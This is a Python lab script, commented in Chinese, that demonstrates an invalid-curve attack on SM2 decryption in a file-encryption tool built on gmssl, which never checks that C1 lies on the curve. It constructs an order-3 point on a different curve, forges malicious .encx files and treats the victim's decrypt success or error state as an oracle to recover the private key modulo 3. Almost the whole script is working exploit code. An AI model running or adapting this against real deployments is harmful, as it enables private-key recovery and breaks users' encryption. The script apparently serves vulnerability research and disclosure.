"""攻击4：无效曲线攻击（Biehl–Meyer–Müller）—— 针对缺失的 C1 在曲线校验。

漏洞：gmssl CryptSM2.decrypt 直接对 C1 做 _kg(d, C1)，从不检查 C1 是否在
sm2p256v1 曲线上（GB/T 32918 / GM/T 0003 强制要求校验）。

预言机构造：攻击者手工拼装 .encx（空载荷 + expect_total=0）：
  metadata = ct_len(2) || C1(64B 无效点) || C3(32B) || C2(16B) || SM3(cek*) || nonce || 0
受害者尝试解密 → 成功/失败恰好泄露 1 比特：d·C1 是否等于攻击者假设的 j·Q。

对于阶为 r 的无效点 Q，穷举 j 可恢复 d mod r（CRT 组合多个 r 可逼近完整 d）。
注：gmssl 的 Jacobian 运算在中间命中无穷远点时产生确定性乱码，使部分 d
取值的路径"不干净"——本脚本实证测量真实密钥的泄漏率。
"""

from __future__ import annotations

from pathlib import Path

from gmssl import sm2 as gm_sm2
from gmssl.sm3 import sm3_kdf, sm3_hash as gm_sm3_hash

from lab import KEYS, SAMPLES, build_encx, get

ART = Path(__file__).resolve().parent / "artifacts_ic"

# SM2 推荐曲线参数（公开标准值）
P = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF
A = P - 3
N = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123


def find_order3_point():
    """在"同 a 不同 b'"的无效曲线上找 3 阶点。

    3 阶点满足 3-除子多项式 ψ3(x)=3x⁴+6ax²+12b'x−a²=0；对任意 x>0 解出 b'，
    再要求 y²=x³+ax+b' 为模 p 二次剩余。
    """
    x = 7
    while x < 4000:
        num = (A * A - 3 * pow(x, 4, P) - 6 * A * pow(x, 2, P)) % P
        den = pow(12 * x % P, P - 2, P)
        b = num * den % P
        rhs = (pow(x, 3, P) + A * x + b) % P
        if pow(rhs, (P - 1) // 2, P) == 1:
            y = pow(rhs, (P + 1) // 4, P)
            if y * y % P == rhs:
                return x, y, b
        x += 1
    raise RuntimeError("未找到 3 阶点")


def crypt_for(priv_hex: str) -> gm_sm2.CryptSM2:
    return gm_sm2.CryptSM2(public_key="", private_key=priv_hex, mode=1, asn1=False)


def craft_oracle_file(Q_xy_hex: str, hypothesis_xy_hex: str, cek0: bytes,
                      nonce_prefix: bytes = b"\x11" * 8) -> bytes:
    """拼装预言机 .encx：当且仅当 _kg(d,Q)==hypothesis 时解密"成功"。"""
    C1 = Q_xy_hex                                   # 128 hex（x||y，无 04 前缀）
    C3 = "00" * 32
    t = sm3_kdf(hypothesis_xy_hex.encode("utf8"), 16)  # klen=16 字节（CEK 长度）
    C2 = "%032x" % (int(cek0.hex(), 16) ^ int(t, 16))
    wrapped = bytes.fromhex(C1 + C3 + C2)            # 112 B
    cek_check = bytes.fromhex(gm_sm3_hash([i for i in cek0]))
    meta = (len(wrapped).to_bytes(2, "big") + wrapped + cek_check
            + nonce_prefix + (0).to_bytes(8, "big"))
    return build_encx("sm2-sm4-gcm", b"", meta)


def victim_try_decrypt(encx_bytes: bytes, priv_key_file: Path) -> str:
    """受害者行为：用真实引擎尝试解密攻击者文件。

    返回三态（对攻击者可区分——本身就是信息泄露）：
      "success" / "wrongkey" / "crash"（畸形输入引发内部 TypeError）
    """
    from encryptor.sdk import WrongPasswordError, PluginError
    from encryptor import engine
    f = ART / "malicious.encx"
    f.write_bytes(encx_bytes)
    out = ART / "malicious.out"
    out.unlink(missing_ok=True)
    try:
        engine.decrypt_file(get("sm2-sm4-gcm"), f, out, str(priv_key_file))
        return "success"
    except WrongPasswordError:
        return "wrongkey"
    except PluginError as exc:
        return f"crash({exc})"


def main() -> None:
    import shutil
    if ART.exists():
        shutil.rmtree(ART)
    ART.mkdir(exist_ok=True)

    print("=" * 78)
    print("A) 前置：生成受害者 SM2 密钥对（真实插件）")
    plugin = get("sm2-sm4-gcm")
    pub_path, priv_path = plugin.generate_keypair(ART / "victim_keys")
    import base64
    priv_hex = base64.b64decode(
        priv_path.read_text().split("-----BEGIN SM2 PRIVATE KEY-----")[1]
        .split("-----END SM2 PRIVATE KEY-----")[0].replace("\n", "")).hex()
    d = int(priv_hex, 16)
    print(f"  私钥 d mod 3 = {d % 3}")

    print()
    print("=" * 78)
    print("B)  sanity：C1 = G（生成元）—— d·G = 公钥，攻击者已知 → 必成功")
    empty = gm_sm2.CryptSM2(public_key="", private_key="", mode=1, asn1=False)
    G = empty.ecc_table["g"]
    pub_xy = crypt_for(priv_hex)._kg(d, G)   # = 公钥（攻击者从公钥文件即可获得）
    blob = craft_oracle_file(G, pub_xy, b"\xAA" * 16)
    st = victim_try_decrypt(blob, priv_path)
    print(f"  受害者解密恶意文件状态 = {st!r}")
    print("  → 证明：C1 无任何在曲线校验；攻击者可任意控制解密'成功/失败'；")
    print("    空载荷+expect_total=0 的恶意文件在受害者软件上显示'解密完成'。")

    print()
    print("=" * 78)
    print("C)  3 阶无效点 Q：测量 _kg(d,Q) 的干净率（决定泄漏率）")
    x, y, b = find_order3_point()
    print(f"  无效曲线参数: a=-3(同SM2) b'={b % P >> 200:x}... x={x} y={y % P >> 200:x}...")
    Q_hex = f"{x:064x}{y:064x}"
    c = crypt_for(priv_hex)
    Q1 = c._kg(1, Q_hex)   # = Q
    Q2 = c._kg(2, Q_hex)   # = 2Q = -Q

    # 对多个随机密钥统计"干净路径"比例
    import random as _r
    clean = 0
    trials = 40
    for i in range(trials):
        dd = int(gm_sm2.func.random_hex(64), 16) % N or 1
        r = crypt_for(f"{dd:064x}")._kg(dd, Q_hex)
        expect = {1: Q1, 2: Q2}[dd % 3] if dd % 3 else None
        if (dd % 3 != 0 and r == expect):
            clean += 1
    print(f"  随机 {trials} 个 d：_kg(d,Q) 恰好等于真实 d·Q 的比例 = {clean}/{trials}")
    print(f"  （d%3==0 时结果为乱码——无穷远点路径；d%3!=0 时也可能命中乱码路径）")

    print()
    print("=" * 78)
    print("D)  端到端预言机攻击：恢复本受害者密钥的 d mod 3")
    got = None
    states = {}
    for j, xy in ((1, Q1), (2, Q2)):
        blob = craft_oracle_file(Q_hex, xy, b"\xBB" * 16)
        states[j] = victim_try_decrypt(blob, priv_path)
        if states[j] == "success":
            got = j
            break
    print(f"  假设 j=1 状态={states.get(1)!r}  j=2 状态={states.get(2)!r}")
    print(f"  预言机输出 d mod 3 = {got}   真实 d mod 3 = {d % 3}")
    if got is None:
        print("  → 本密钥路径'不干净'（中间命中无穷远点→乱码/None），本轮未泄漏 residue；")
        print("    但注意 'wrongkey' 与 'crash(...)' 两种可区分状态本身就是旁路信息，")
        print("    且恶意文件让真实软件抛出内部 TypeError（健壮性缺陷）。")

    print()
    print("=" * 78)
    print("E)  对照实验：把 C1 换成攻击者构造的不在任何曲线上的随机点，")
    print("    软件同样不报格式错误——校验缺失的直接证据")
    junk_xy = f"{123456789:064x}{987654321:064x}"
    try:
        r = crypt_for(priv_hex)._kg(d, junk_xy)
        print(f"  _kg(随机无效点) 返回了坐标（无异常）: {r[:16]}...")
    except Exception as exc:
        print(f"  异常: {exc}")


if __name__ == "__main__":
    main()
